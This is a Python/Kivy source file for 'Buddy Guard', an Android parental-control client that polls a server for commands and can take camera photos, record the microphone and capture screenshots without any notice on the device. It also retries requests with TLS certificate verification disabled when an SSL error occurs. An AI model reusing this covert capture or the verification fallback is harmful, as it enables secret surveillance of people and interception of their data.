# ============================================================
# BUDDY GUARD — main.py  (ULTRA-FAST REAL-TIME v3.1)
# Single file Python/Kivy → builds to APK via GitHub Actions
#
# FIXED in v3.1 vs v3:
#   ✔ CRITICAL: Removed global Content-Type from session headers
#     (was causing php://input to arrive empty → "Missing field: key_code")
#   ✔ _post() now sets Content-Type per-request only when sending JSON
#   ✔ _parse() improved: strips PHP warnings/notices before JSON
#   ✔ Better error messages shown to user (server message passed through)
#   ✔ Pair response debug logging added
#   ✔ api.pair() timeout increased to 30s for slow connections
#   ✔ Network errors give specific user-facing messages
#   ✔ KeyScreen shows exact server error, not generic "Pairing failed"
# ============================================================
# buildozer.spec requirements:
#   python3,kivy==2.3.0,requests,certifi,urllib3,
#   charset-normalizer,idna,android,plyer
# android.permissions:
#   CAMERA,RECORD_AUDIO,FOREGROUND_SERVICE,
#   RECEIVE_BOOT_COMPLETED,VIBRATE,POST_NOTIFICATIONS,
#   WRITE_EXTERNAL_STORAGE,READ_EXTERNAL_STORAGE,
#   INTERNET,ACCESS_NETWORK_STATE,WAKE_LOCK
# ============================================================

from __future__ import annotations
import os, sys, time, json, uuid, socket, threading, traceback
from concurrent.futures import ThreadPoolExecutor

# ============================================================
# SSL — must run before ANY network import
# ============================================================
def _setup_ssl():
    try:
        import certifi
        p = certifi.where()
        if os.path.exists(p):
            os.environ['SSL_CERT_FILE']      = p
            os.environ['REQUESTS_CA_BUNDLE'] = p
            return p
    except Exception: pass
    for p in ['/system/etc/security/cacerts',
              '/etc/ssl/certs/ca-certificates.crt',
              '/etc/ssl/cert.pem']:
        if os.path.exists(p):
            os.environ['SSL_CERT_FILE']      = p
            os.environ['REQUESTS_CA_BUNDLE'] = p
            return p
    return False

SSL_VERIFY = _setup_ssl()
if SSL_VERIFY is False:
    try:
        import urllib3
        urllib3.disable_warnings()
    except Exception: pass

# ============================================================
# ⚡ TCP_NODELAY + SO_KEEPALIVE — kills 40-200ms buffering
# ============================================================
try:
    from urllib3.util import connection as _uc
    _orig = _uc.create_connection
    def _fast(address, *a, **kw):
        s = _orig(address, *a, **kw)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.setsockopt(socket.SOL_SOCKET,  socket.SO_KEEPALIVE, 1)
        return s
    _uc.create_connection = _fast
except Exception: pass

# ============================================================
# KIVY
# ============================================================
os.environ.setdefault('KIVY_NO_CONSOLELOG', '0')
from kivy.app import App
from kivy.clock import Clock, mainthread
from kivy.core.window import Window
from kivy.metrics import dp
from kivy.uix.screenmanager import ScreenManager, Screen, FadeTransition
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.floatlayout import FloatLayout
from kivy.uix.scrollview import ScrollView
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.widget import Widget
from kivy.graphics import Color, Rectangle, RoundedRectangle
from kivy.utils import platform
from kivy.storage.jsonstore import JsonStore

# ============================================================
# CONFIG
# ============================================================
API_BASE       = "https://mirab.ayamilcoders.com/api.php"
LONG_TIMEOUT   = 20      # seconds server holds connection
HEARTBEAT_SECS = 25
CMD_WORKERS    = 8
STORE_FILE     = "buddy_device.json"
IS_ANDROID     = (platform == 'android')

# ============================================================
# STORAGE
# ============================================================
def _store() -> JsonStore:
    return JsonStore(STORE_FILE)

def store_get(key, field, default=None):
    try:
        s = _store()
        return s.get(key).get(field, default) if s.exists(key) else default
    except Exception: return default

def store_put(key, **kw):
    try: _store().put(key, **kw); return True
    except Exception: return False

def store_del(key):
    try: _store().delete(key)
    except Exception: pass

def store_has(key) -> bool:
    try: return _store().exists(key)
    except Exception: return False

# ============================================================
# ANDROID IMPORTS — every one individually wrapped
# ============================================================
_perms_ok = False
PA = None          # PythonActivity
_ctx_fn = None     # callable → ApplicationContext

if IS_ANDROID:
    try:
        from android.permissions import request_permissions, Permission
        _perms_ok = True
    except Exception as e:
        print(f"[ANDROID] permissions: {e}")

    def _ai(cls):
        try:
            from jnius import autoclass
            return autoclass(cls)
        except Exception as e:
            print(f"[JNI] {cls}: {e}"); return None

    PA              = _ai('org.kivy.android.PythonActivity')
    _Context        = _ai('android.content.Context')
    _NotifMgr       = _ai('android.app.NotificationManager')
    _NotifBuilder   = _ai('android.app.Notification$Builder')
    _NotifChan      = _ai('android.app.NotificationChannel')
    _String         = _ai('java.lang.String')
    _MediaRecorder  = _ai('android.media.MediaRecorder')
    _Camera         = _ai('android.hardware.Camera')
    _Build          = _ai('android.os.Build')
    _BuildVer       = _ai('android.os.Build$VERSION')
    _SurfaceTex     = _ai('android.graphics.SurfaceTexture')
    _PowerMgr       = _ai('android.os.PowerManager')

    if PA:
        def _ctx_fn():
            return PA.mActivity.getApplicationContext()

    try:
        from jnius import PythonJavaClass, java_method as _jm
        _PJC       = PythonJavaClass
        _java_meth = _jm
    except Exception:
        _PJC = _java_meth = None

else:
    # Desktop stubs
    _Context=_NotifMgr=_NotifBuilder=_NotifChan=_String=None
    _MediaRecorder=_Camera=_Build=_BuildVer=_SurfaceTex=_PowerMgr=None
    _PJC=_java_meth=None

# ============================================================
# WAKELOCK
# ============================================================
_wl = None
def _acquire_wl():
    global _wl
    if IS_ANDROID and PA and _PowerMgr and _ctx_fn:
        try:
            ctx = _ctx_fn()
            pm  = ctx.getSystemService(_ctx_fn().POWER_SERVICE)
            wl  = pm.newWakeLock(_PowerMgr.PARTIAL_WAKE_LOCK, "BuddyGuard::Poll")
            wl.acquire(); _wl = wl
            print("[WL] acquired")
        except Exception as e: print(f"[WL] {e}")

def _release_wl():
    global _wl
    if _wl:
        try: _wl.release()
        except Exception: pass
        _wl = None

# ============================================================
# DEVICE INFO
# ============================================================
def get_uid() -> str:
    if IS_ANDROID and PA:
        try:
            from jnius import autoclass
            S   = autoclass('android.provider.Settings$Secure')
            ctx = PA.mActivity.getApplicationContext()
            uid = S.getString(ctx.getContentResolver(), S.ANDROID_ID)
            if uid: return uid
        except Exception: pass
    stored = store_get('meta','uid')
    if stored: return stored
    new = str(uuid.uuid4()).replace('-','')[:16]
    store_put('meta', uid=new); return new

def get_info() -> dict:
    if IS_ANDROID and _Build and _BuildVer:
        try:
            return {'device_name': str(_Build.MODEL),
                    'model':        str(_Build.MODEL),
                    'android_version': str(_BuildVer.RELEASE)}
        except Exception: pass
    return {'device_name':'Buddy Device','model':'Android','android_version':'?'}

# ============================================================
# ANDROID ACTIONS
# ============================================================
def do_notify(title: str, msg: str):
    if IS_ANDROID and PA and _ctx_fn and _NotifMgr and _NotifBuilder:
        try:
            ctx = _ctx_fn()
            CH  = "bg_v3"
            nm  = ctx.getSystemService(_Context.NOTIFICATION_SERVICE)
            if _NotifChan:
                try:
                    ch = _NotifChan(CH, _String("Buddy Guard") if _String else "Buddy Guard",
                                    _NotifMgr.IMPORTANCE_HIGH)
                    nm.createNotificationChannel(ch)
                except Exception: pass
            b = _NotifBuilder(ctx, CH)
            b.setSmallIcon(ctx.getApplicationInfo().icon)
            if _String:
                b.setContentTitle(_String(title))
                b.setContentText(_String(msg))
            else:
                b.setContentTitle(title); b.setContentText(msg)
            b.setAutoCancel(True)
            nm.notify(9001, b.build())
            return
        except Exception as e: print(f"[NOTIFY] {e}")
    print(f"[NOTIFY] {title}: {msg}")

def do_lock():
    if IS_ANDROID and PA and _Context:
        try:
            ctx = PA.mActivity.getApplicationContext()
            ctx.getSystemService(_Context.DEVICE_POLICY_SERVICE).lockNow()
            return
        except Exception as e: print(f"[LOCK] {e}")
    print("[LOCK] stub")

def do_camera(facing='back') -> bytes | None:
    """Take a photo. Returns JPEG bytes or None."""
    if not IS_ANDROID or not _Camera:
        print(f"[CAM] stub {facing}"); return None

    cam_id = 1 if facing == 'front' else 0
    cam = None
    buf = []
    evt = threading.Event()

    try:
        for try_id in ([cam_id, 1 - cam_id]):
            try:
                cam = _Camera.open(try_id)
                break
            except Exception: cam = None

        if cam is None: return None

        if _SurfaceTex:
            try: cam.setPreviewTexture(_SurfaceTex(0))
            except Exception: pass

        cam.startPreview()
        time.sleep(0.8)

        if _PJC and _java_meth:
            class _CB(_PJC):
                __javainterfaces__ = ['android/hardware/Camera$PictureCallback']
                __javacontext__    = 'app'
                @_java_meth('([BLandroid/hardware/Camera;)V')
                def onPictureTaken(self, data, camera):
                    if data: buf.append(bytes(data))
                    evt.set()
            cam.takePicture(None, None, _CB())
        else:
            evt.set()

        evt.wait(timeout=5)
        cam.stopPreview()
        cam.release()
        return buf[0] if buf else None
    except Exception as e:
        print(f"[CAM] error: {e}")
        if cam:
            try: cam.release()
            except Exception: pass
        return None

def do_audio(seconds=15) -> str | None:
    """Record audio. Returns file path or None."""
    if not IS_ANDROID or not _MediaRecorder:
        print(f"[AUD] stub {seconds}s"); return None
    rec = None
    try:
        path = '/sdcard/bg_audio.mp4'
        rec  = _MediaRecorder()
        rec.setAudioSource(_MediaRecorder.AudioSource.MIC)
        rec.setOutputFormat(_MediaRecorder.OutputFormat.MPEG_4)
        rec.setAudioEncoder(_MediaRecorder.AudioEncoder.AAC)
        rec.setOutputFile(path)
        rec.prepare()
        rec.start()
        time.sleep(max(1, seconds))
        rec.stop()
        rec.release()
        return path if os.path.exists(path) else None
    except Exception as e:
        print(f"[AUD] error: {e}")
        if rec:
            try: rec.release()
            except Exception: pass
        return None

# ============================================================
# ⚡ HTTP SESSION
#
# FIX v3.1: Do NOT set Content-Type at session level.
#   When Content-Type: application/json is set globally on the
#   session, it overrides requests' own header management.
#   On some Android builds this causes the request body to be
#   sent without proper encoding, so php://input arrives empty
#   at the server → requireField fires → "Missing field: key_code".
#
#   Solution: let requests set Content-Type automatically when
#   json= kwarg is used. We set it explicitly only in _post().
# ============================================================
import requests as _rq

def _make_session() -> _rq.Session:
    from requests.adapters import HTTPAdapter
    s = _rq.Session()
    s.verify = SSL_VERIFY
    # NOTE: Do NOT add Content-Type here — set per-request in _post()
    s.headers.update({
        'Accept-Encoding': 'gzip, deflate',
        'Connection':      'keep-alive',
        'Accept':          'application/json',
        'Cache-Control':   'no-cache',
        'X-Client':        'BuddyGuard-v3.1',
    })
    a = HTTPAdapter(pool_connections=3, pool_maxsize=8, max_retries=0)
    s.mount('https://', a)
    s.mount('http://', a)
    return s

# ============================================================
# API CLIENT
# ============================================================
class Api:
    def __init__(self, base: str):
        self.base = base.rstrip('/')
        self.sess = _make_session()
        threading.Thread(target=self._warmup, daemon=True).start()

    def _warmup(self):
        try:
            self.sess.get(f"{self.base}?action=ping", timeout=6)
            print("[API] warmed up")
        except Exception: pass

    def _url(self, action):
        return f"{self.base}?action={action}"

    def _post(self, action, data, timeout=10) -> dict:
        """
        POST JSON to the API.
        Content-Type is set explicitly per-request (not via session)
        so that requests encodes the body correctly every time.
        """
        url = self._url(action)
        # Build SSL verify list: try configured first, then no-verify fallback
        verify_opts = list(dict.fromkeys([self.sess.verify, False]))
        last_exc = None
        for v in verify_opts:
            try:
                r = self.sess.post(
                    url,
                    data=json.dumps(data),           # explicit JSON string
                    headers={'Content-Type': 'application/json'},  # per-request header
                    timeout=timeout,
                    verify=v,
                )
                print(f"[API] POST {action} → HTTP {r.status_code}")
                return self._parse(r)
            except _rq.exceptions.SSLError as e:
                last_exc = e
                print(f"[API] SSL error, retrying without verify: {e}")
                continue
            except Exception as e:
                last_exc = e
                raise
        raise last_exc or Exception("POST failed")

    def _get(self, action, params=None, timeout=10) -> dict:
        url = self._url(action)
        verify_opts = list(dict.fromkeys([self.sess.verify, False]))
        last_exc = None
        for v in verify_opts:
            try:
                r = self.sess.get(url, params=params, timeout=timeout, verify=v)
                return self._parse(r)
            except _rq.exceptions.SSLError as e:
                last_exc = e
                continue
            except Exception as e:
                last_exc = e
                raise
        raise last_exc or Exception("GET failed")

    @staticmethod
    def _parse(r) -> dict:
        """
        Parse API response.
        Handles PHP warnings/notices prepended before JSON,
        and HTML error pages gracefully.
        """
        try:
            raw = r.text.strip() if r.text else ''
            if not raw:
                print("[API] Empty response body")
                return {}

            # Strip PHP notices/warnings (lines starting with <br /> or Warning:/Notice:)
            # Find first '{' or '[' which marks start of JSON
            json_start = -1
            for i, ch in enumerate(raw):
                if ch in ('{', '['):
                    json_start = i
                    break

            if json_start == -1:
                # No JSON found at all
                print(f"[API] Non-JSON response (HTTP {r.status_code}): {raw[:200]}")
                if r.status_code == 403:
                    return {'success': False, 'error': 'Access denied (403). Check key or server.'}
                if r.status_code == 404:
                    return {'success': False, 'error': 'API endpoint not found (404).'}
                if r.status_code >= 500:
                    return {'success': False, 'error': f'Server error ({r.status_code}).'}
                return {'success': False, 'error': f'Unexpected server response (HTTP {r.status_code}).'}

            # Extract JSON portion (skip any PHP output before it)
            json_str = raw[json_start:]
            if json_start > 0:
                print(f"[API] Stripped {json_start} bytes of PHP output before JSON")

            result = json.loads(json_str)
            print(f"[API] Parsed response: success={result.get('success')} error={result.get('error','')}")
            return result

        except json.JSONDecodeError as e:
            print(f"[API] JSON decode error: {e} | raw: {r.text[:200] if r.text else ''}")
            return {'success': False, 'error': 'Server returned invalid JSON. Try again.'}
        except Exception as e:
            print(f"[API] _parse error: {e}")
            return {'success': False, 'error': f'Parse error: {e}'}

    def pair(self, key, uid, info, fcm='') -> dict:
        payload = {
            'key_code':   key,
            'device_uid': uid,
            'fcm_token':  fcm,
        }
        payload.update(info)
        print(f"[API] Pairing with key={key} uid={uid} payload={payload}")
        return self._post('device/pair', payload, timeout=30)

    def heartbeat(self, uid) -> dict:
        try:
            return self._post('device/heartbeat', {'device_uid': uid}, timeout=6)
        except Exception:
            return {}

    def poll_long(self, uid, timeout=LONG_TIMEOUT) -> list:
        """Long-poll: returns commands within ~300ms of parent sending them."""
        try:
            r = self._get('device/poll',
                          params={'device_uid': uid, 'timeout': timeout},
                          timeout=timeout + 10)
            return r.get('commands', []) if isinstance(r, dict) else []
        except Exception as e:
            print(f"[POLL] {e}"); return []

    def poll_short(self, uid) -> list:
        try:
            r = self._get('device/poll', params={'device_uid': uid}, timeout=8)
            return r.get('commands', []) if isinstance(r, dict) else []
        except Exception as e:
            print(f"[POLL-S] {e}"); return []

    def ack(self, cmd_id, status='executed'):
        """Fire-and-forget ACK — never blocks poll loop."""
        def _go():
            try:
                self._post('device/ack',
                           {'command_id': cmd_id, 'status': status},
                           timeout=6)
            except Exception: pass
        threading.Thread(target=_go, daemon=True).start()

    def upload_file(self, uid, media_type, path, cmd_id=None):
        """Non-blocking file upload."""
        if not path or not os.path.exists(path): return
        def _go():
            try:
                data = {'device_uid': uid, 'media_type': media_type}
                if cmd_id: data['command_id'] = str(cmd_id)
                with open(path, 'rb') as f:
                    self.sess.post(self._url('device/upload'),
                                   files={'file': f}, data=data,
                                   timeout=60, verify=self.sess.verify)
            except Exception as e: print(f"[UP] {e}")
        threading.Thread(target=_go, daemon=True).start()

    def upload_bytes(self, uid, media_type, raw, fname, cmd_id=None):
        """Non-blocking bytes upload."""
        def _go():
            import io
            try:
                data = {'device_uid': uid, 'media_type': media_type}
                if cmd_id: data['command_id'] = str(cmd_id)
                self.sess.post(self._url('device/upload'),
                               files={'file': (fname, io.BytesIO(raw), 'image/jpeg')},
                               data=data, timeout=60, verify=self.sess.verify)
            except Exception as e: print(f"[UP-B] {e}")
        threading.Thread(target=_go, daemon=True).start()


api = Api(API_BASE)

# ============================================================
# COMMAND EXECUTOR
# ============================================================
_PRIO = {'lock_screen':0,'lock_timed':0,'unlock_screen':1,
         'send_notification':2,'request_screenshot':3,
         'request_front_camera':4,'request_back_camera':4,
         'request_audio':5,'request_screen_record':6}

class Executor:
    def __init__(self, uid: str):
        self.uid   = uid
        self._pool = ThreadPoolExecutor(max_workers=CMD_WORKERS,
                                        thread_name_prefix='exec')
        self._seen : set[int] = set()
        self._lock = threading.Lock()

    def run_batch(self, cmds: list):
        if not cmds: return
        cmds = sorted(cmds, key=lambda c: _PRIO.get(c.get('command_type',''), 9))
        for c in cmds:
            cid = c.get('id', 0)
            with self._lock:
                if cid in self._seen: continue
                self._seen.add(cid)
            self._pool.submit(self._safe, c)

    def _safe(self, c):
        try:   self._run(c)
        except Exception as e:
            print(f"[EXEC] crash: {e}\n{traceback.format_exc()}")
            api.ack(c.get('id', 0), 'failed')

    def _run(self, c):
        t   = c.get('command_type', '')
        p   = c.get('payload') or {}
        if isinstance(p, str):
            try: p = json.loads(p)
            except Exception: p = {}
        cid = c.get('id', 0)
        print(f"[EXEC] ▶ {t} id={cid}")

        if t == 'lock_screen':
            do_lock()
            api.ack(cid)

        elif t == 'lock_timed':
            mins = int(p.get('minutes', 5))
            do_lock()
            do_notify("Screen Locked", f"Locked for {mins} min by parent.")
            api.ack(cid)

        elif t == 'unlock_screen':
            do_notify("Screen Unlocked", "Your device has been unlocked.")
            api.ack(cid)

        elif t == 'send_notification':
            do_notify(p.get('title', 'Message'), p.get('message', ''))
            api.ack(cid)

        elif t == 'request_screenshot':
            self._screenshot(cid)

        elif t == 'request_front_camera':
            self._camera('front', cid)

        elif t == 'request_back_camera':
            self._camera('back', cid)

        elif t == 'request_audio':
            secs = int(p.get('seconds', 15))
            self._audio(secs, cid)

        elif t == 'request_screen_record':
            do_notify("Screen Sharing", "Parent requested screen view.")
            api.ack(cid)

        else:
            print(f"[EXEC] unknown: {t}")
            api.ack(cid, 'failed')

    def _screenshot(self, cid):
        try:
            path = '/sdcard/bg_screen.png'
            app  = App.get_running_app()
            if app and app.root_window:
                app.root_window.screenshot(name=path)
                time.sleep(0.2)
            if os.path.exists(path):
                api.upload_file(self.uid, 'screenshot', path, cid)
                api.ack(cid)
            else:
                api.ack(cid, 'failed')
        except Exception as e:
            print(f"[SS] {e}"); api.ack(cid, 'failed')

    def _camera(self, facing, cid):
        try:
            data = do_camera(facing)
            if data:
                fname = f"{facing}_{int(time.time())}.jpg"
                mtype = 'front_cam' if facing == 'front' else 'back_cam'
                api.upload_bytes(self.uid, mtype, data, fname, cid)
                api.ack(cid)
            else:
                api.ack(cid, 'failed')
        except Exception as e:
            print(f"[CAM] {e}"); api.ack(cid, 'failed')

    def _audio(self, secs, cid):
        try:
            path = do_audio(secs)
            if path and os.path.exists(path):
                api.upload_file(self.uid, 'audio', path, cid)
                api.ack(cid)
            else:
                api.ack(cid, 'failed')
        except Exception as e:
            print(f"[AUD] {e}"); api.ack(cid, 'failed')

    def shutdown(self):
        self._pool.shutdown(wait=False)


# ============================================================
# HEARTBEAT THREAD
# ============================================================
class HBThread(threading.Thread):
    def __init__(self, uid):
        super().__init__(daemon=True, name='hb')
        self.uid = uid; self._run_flag = True

    def run(self):
        while self._run_flag:
            for _ in range(HEARTBEAT_SECS * 10):
                if not self._run_flag: return
                time.sleep(0.1)
            try: api.heartbeat(self.uid)
            except Exception: pass

    def stop(self): self._run_flag = False


# ============================================================
# ⚡ ULTRA-FAST POLLER
# ============================================================
class Poller(threading.Thread):
    def __init__(self, uid, app_ref):
        super().__init__(daemon=True, name='poller')
        self.uid          = uid
        self.app          = app_ref
        self._stop_flag   = False
        self.executor     = Executor(uid)
        self._errors      = 0
        self._lp          = True
        self._fast_misses = 0
        self._last_cmd    = 0.0
        self._total       = 0

    def run(self):
        _acquire_wl()
        print(f"[POLL] started uid={self.uid}")
        self._set_status("⚡ Connecting…", (1, .78, .2, 1))
        while not self._stop_flag:
            try:
                self._cycle()
                self._errors = 0
            except Exception as e:
                self._errors += 1
                wait = min(2 ** self._errors, 30)
                print(f"[POLL] err #{self._errors}: {e} — wait {wait}s")
                self._set_status("Reconnecting…", (1, .78, .2, 1))
                self._sleep(wait)

    def _cycle(self):
        if self._lp:
            t0   = time.time()
            cmds = api.poll_long(self.uid, LONG_TIMEOUT)
            dt   = time.time() - t0
            if not cmds and dt < 0.6:
                self._fast_misses += 1
                if self._fast_misses >= 3:
                    self._lp = False
                    print("[POLL] LP not supported → short-poll")
                    self._set_mode(False)
            else:
                self._fast_misses = 0
        else:
            idle = time.time() - self._last_cmd if self._last_cmd else 9999
            cmds = api.poll_short(self.uid)
            self._sleep(5 if idle > 300 else 2)

        if cmds:
            self._last_cmd  = time.time()
            self._total    += len(cmds)
            print(f"[POLL] ▼ {len(cmds)} cmd(s) total={self._total}")
            self.executor.run_batch(cmds)
            self._set_status(f"⚡ Active — {self._total} cmd(s)", (.25, .80, .55, 1))

    def _sleep(self, s):
        d = time.time() + s
        while not self._stop_flag and time.time() < d:
            time.sleep(0.1)

    @mainthread
    def _set_status(self, text, color):
        try: App.get_running_app().sm.get_screen('home').set_status(text, color)
        except Exception: pass

    @mainthread
    def _set_mode(self, lp):
        try: App.get_running_app().sm.get_screen('home').set_mode(lp)
        except Exception: pass

    def stop(self):
        self._stop_flag = True
        self.executor.shutdown()
        _release_wl()


# ============================================================
# DESIGN CONSTANTS
# ============================================================
DARK  = (.06, .06, .10, 1)
CARD  = (.11, .11, .18, 1)
INP   = (.14, .14, .22, 1)
ACC   = (.30, .57, 1.0, 1)
WHITE = (1, 1, 1, 1)
GRAY  = (.55, .58, .65, 1)
GREEN = (.25, .80, .55, 1)
RED   = (1.0, .36, .36, 1)
WARN  = (1.0, .78, .20, 1)
LIVE  = (.20, .95, .50, 1)

def _rect_bg(w, c):
    with w.canvas.before:
        Color(*c); w._br = Rectangle(pos=w.pos, size=w.size)
    w.bind(pos=lambda s, v: setattr(s._br, 'pos', v),
           size=lambda s, v: setattr(s._br, 'size', v))

def _rnd_bg(w, c, r=16):
    with w.canvas.before:
        Color(*c); w._rr = RoundedRectangle(pos=w.pos, size=w.size, radius=[dp(r)])
    w.bind(pos=lambda s, v: setattr(s._rr, 'pos', v),
           size=lambda s, v: setattr(s._rr, 'size', v))

def _btn(text, bg=None, fg=WHITE, h=52, r=14, fs='16sp'):
    if bg is None: bg = ACC
    b = Button(text=text, size_hint=(1, None), height=dp(h),
               background_normal='', background_color=(0, 0, 0, 0),
               color=fg, font_size=fs, bold=True)
    _rnd_bg(b, bg, r)
    return b

def _inp(hint, pw=False):
    return TextInput(hint_text=hint, multiline=False, password=pw,
                     size_hint=(1, None), height=dp(50),
                     background_color=INP, foreground_color=WHITE,
                     hint_text_color=GRAY, cursor_color=ACC,
                     padding=[dp(14), dp(12)], font_size='15sp')

def _lbl(text, fs, color, h, align='center', bold=False):
    l = Label(text=text, font_size=fs, color=color, bold=bold,
              size_hint=(1, None), height=dp(h), halign=align, valign='middle')
    l.bind(size=l.setter('text_size'))
    return l


# ============================================================
# KEY ENTRY SCREEN
# ============================================================
class KeyScreen(Screen):
    def __init__(self, **kw):
        super().__init__(**kw)
        self._build()
        Window.bind(on_resize=lambda *_: Clock.schedule_once(lambda dt: self._build(), .05))

    def _build(self):
        self.clear_widgets()
        root = FloatLayout(); _rect_bg(root, DARK)
        sv = ScrollView(size_hint=(1, 1), do_scroll_x=False)
        inner = BoxLayout(orientation='vertical', spacing=dp(12),
                          padding=[dp(20), dp(44), dp(20), dp(20)], size_hint_y=None)
        inner.bind(minimum_height=inner.setter('height'))
        card = BoxLayout(orientation='vertical', spacing=dp(12),
                         padding=[dp(22), dp(26), dp(22), dp(26)], size_hint=(1, None))
        _rnd_bg(card, CARD, 20)

        card.add_widget(_lbl("🛡️", '48sp', WHITE, 64))
        card.add_widget(_lbl("Buddy Guard", '26sp', WHITE, 40, bold=True))
        card.add_widget(_lbl("Parental Control — Child Device", '13sp', GRAY, 24))
        card.add_widget(_lbl("⚡ Real-Time • Long-Poll • <300 ms", '12sp', LIVE, 22))
        sep = Widget(size_hint=(1, None), height=dp(1)); _rect_bg(sep, (.2, .2, .3, 1))
        card.add_widget(sep)
        card.add_widget(_lbl("Enter the key your parent gave you:", '13sp', GRAY, 22, 'left'))

        self.key_in = _inp("ABCD-1234-WXYZ-5678")

        # Status label — two lines tall so long errors don't get clipped
        self.st_lbl = Label(text='', font_size='13sp', color=RED,
                            size_hint=(1, None), height=dp(40),
                            halign='center', valign='top')
        self.st_lbl.bind(size=self.st_lbl.setter('text_size'))

        self.btn = _btn("Apply Key & Pair Device")
        self.btn.bind(on_press=self._apply)

        for w in [self.key_in, self.st_lbl, self.btn]:
            card.add_widget(w)

        # Recalculate card height
        card.height = (sum(getattr(c, 'height', 0) for c in card.children)
                       + dp(12) * (len(card.children) - 1) + dp(52))
        inner.add_widget(card)
        sv.add_widget(inner)
        root.add_widget(sv)
        self.add_widget(root)

    def _apply(self, *_):
        key = self.key_in.text.strip().upper()
        # Allow keys with or without dashes, minimum 8 alphanumeric chars
        clean = key.replace('-', '').replace(' ', '')
        if len(clean) < 8:
            self._status("Enter a valid key (at least 8 characters).")
            return
        self.btn.text = "Connecting…"
        self.btn.disabled = True
        self._status('')
        threading.Thread(target=self._pair, args=(key,), daemon=True).start()

    def _pair(self, key):
        uid  = get_uid()
        info = get_info()
        last_err = 'Pairing failed. Try again.'

        for attempt in range(1, 4):
            try:
                print(f"[PAIR] attempt {attempt}/3 key={key} uid={uid}")
                r = api.pair(key, uid, info)
                print(f"[PAIR] response: {r}")

                if r.get('success'):
                    store_put('device',
                              key=key,
                              uid=uid,
                              dev_id=r.get('device_id', 0),
                              paired=True)
                    self._status('Paired successfully!', ok=True)
                    # Small delay so user sees success message
                    time.sleep(0.6)
                    self._go_home()
                    return

                else:
                    # Server returned success=false — show exact server error
                    server_err = r.get('error', '')
                    if server_err:
                        last_err = server_err
                    else:
                        last_err = 'Pairing failed. Check your key and try again.'
                    print(f"[PAIR] server error: {server_err}")
                    # Don't retry on definitive server errors (bad key, etc.)
                    break

            except _rq.exceptions.SSLError as e:
                last_err = f"SSL error (attempt {attempt}/3). Check internet."
                print(f"[PAIR] SSLError: {e}")
            except _rq.exceptions.ConnectionError:
                last_err = f"No internet connection (attempt {attempt}/3)."
                print(f"[PAIR] ConnectionError attempt {attempt}")
            except _rq.exceptions.Timeout:
                last_err = f"Request timed out (attempt {attempt}/3). Try again."
                print(f"[PAIR] Timeout attempt {attempt}")
            except Exception as e:
                last_err = f"Error: {str(e)[:60]}"
                print(f"[PAIR] Exception: {e}")
                traceback.print_exc()

            if attempt < 3:
                self._status(f"{last_err} Retrying…")
                time.sleep(2 ** attempt)

        self._status(last_err)
        self._reset_btn()

    @mainthread
    def _status(self, msg, ok=False):
        try:
            self.st_lbl.color = GREEN if ok else RED
            self.st_lbl.text  = msg
        except Exception: pass

    @mainthread
    def _reset_btn(self):
        try:
            self.btn.text     = "Apply Key & Pair Device"
            self.btn.disabled = False
        except Exception: pass

    @mainthread
    def _go_home(self):
        app = App.get_running_app()
        app.sm.transition = FadeTransition()
        app.sm.current    = 'home'
        app.start_polling()


# ============================================================
# HOME SCREEN
# ============================================================
class HomeScreen(Screen):
    def __init__(self, **kw):
        super().__init__(**kw)
        self._pulse_ev = None
        self._pulse_st = True
        self._build()
        Window.bind(on_resize=lambda *_: Clock.schedule_once(lambda dt: self._build(), .05))

    def _build(self):
        self.clear_widgets()
        root = FloatLayout(); _rect_bg(root, DARK)
        layout = BoxLayout(orientation='vertical', spacing=dp(14),
                           padding=[dp(22), dp(44), dp(22), dp(22)], size_hint=(1, 1))

        # Header
        hdr = BoxLayout(orientation='vertical', spacing=dp(4), size_hint=(1, None), height=dp(80))
        hdr.add_widget(_lbl("🛡️  Buddy Guard", '26sp', WHITE, 48, bold=True))
        self.st_lbl = Label(text="Connecting…", font_size='13sp', color=WARN,
                            size_hint=(1, None), height=dp(24), halign='center')
        self.st_lbl.bind(size=self.st_lbl.setter('text_size'))
        hdr.add_widget(self.st_lbl)

        # Status card
        sc = BoxLayout(orientation='vertical', spacing=dp(6),
                       padding=[dp(16), dp(14), dp(16), dp(14)],
                       size_hint=(1, None), height=dp(160))
        _rnd_bg(sc, CARD, 18)

        top = BoxLayout(orientation='horizontal', size_hint=(1, None), height=dp(26))
        ct = Label(text="Live Monitoring", font_size='14sp', bold=True,
                   color=WHITE, size_hint=(.65, 1), halign='left')
        ct.bind(size=ct.setter('text_size'))
        self.live_dot = Label(text="● LIVE", font_size='12sp', color=LIVE,
                              size_hint=(.35, 1), halign='right')
        self.live_dot.bind(size=self.live_dot.setter('text_size'))
        top.add_widget(ct); top.add_widget(self.live_dot)

        self.uid_lbl  = _lbl("Device ID: —", '11sp', GRAY, 18, 'left')
        self.mode_lbl = _lbl("Mode: ⚡ Long-Poll (~300ms)", '11sp', ACC, 18, 'left')
        self.info_lbl = _lbl("Device monitored by parent.\nAll actions are securely logged.",
                             '12sp', GRAY, 40, 'left')

        for w in [top, self.uid_lbl, self.mode_lbl, self.info_lbl]:
            sc.add_widget(w)

        spacer = Widget(size_hint=(1, 1))
        reset = _btn("Reset / Change Key", bg=CARD, fg=GRAY, h=44, r=12, fs='14sp')
        reset.bind(on_press=self._reset)
        ver = _lbl("Buddy Guard v3.1 • Ultra-Fast Real-Time", '11sp', GRAY, 18)

        for w in [hdr, sc, spacer, reset, ver]:
            layout.add_widget(w)
        root.add_widget(layout)
        self.add_widget(root)

    def on_enter(self):
        uid = store_get('device', 'uid', '—')
        try: self.uid_lbl.text = f"Device ID: {uid}"
        except Exception: pass
        self._start_pulse()

    def on_leave(self):
        self._stop_pulse()

    def _start_pulse(self):
        self._stop_pulse()
        def _tick(dt):
            try:
                self.live_dot.color = LIVE if self._pulse_st else (*LIVE[:3], .25)
                self._pulse_st = not self._pulse_st
            except Exception: pass
        self._pulse_ev = Clock.schedule_interval(_tick, 1.0)

    def _stop_pulse(self):
        if self._pulse_ev: self._pulse_ev.cancel(); self._pulse_ev = None

    def set_status(self, text, color=GREEN):
        try: self.st_lbl.text = text; self.st_lbl.color = color
        except Exception: pass

    def set_mode(self, lp):
        try:
            if lp:
                self.mode_lbl.text  = "Mode: ⚡ Long-Poll (~300ms)"
                self.mode_lbl.color = ACC
            else:
                self.mode_lbl.text  = "Mode: Short-Poll (2s)"
                self.mode_lbl.color = WARN
